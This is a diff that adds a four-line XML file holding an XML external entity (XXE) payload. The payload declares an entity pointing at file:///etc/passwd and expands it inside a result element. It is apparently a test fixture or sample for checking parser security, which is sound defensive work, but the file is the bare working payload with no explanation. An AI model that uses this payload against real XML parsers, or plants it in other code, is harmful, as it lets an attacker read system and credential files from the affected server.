@@ -1,0 +1,4 @@
+<!DOCTYPE test[
+<!ENTITY testtest SYSTEM "file:///etc/passwd">
+]>
+<result>&testtest;</result>
